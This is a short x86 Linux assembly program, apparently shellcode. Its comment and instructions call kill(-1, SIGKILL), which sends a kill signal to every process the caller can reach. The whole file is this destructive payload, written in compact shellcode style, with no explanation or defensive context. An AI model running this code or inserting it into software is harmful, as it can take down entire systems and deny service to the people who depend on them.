section .text
        global _start
_start:
        ; kill(-1, SIGKILL);
        mov al, 37
        push byte -1
        pop ebx
        mov cl, 9
        int 0x80

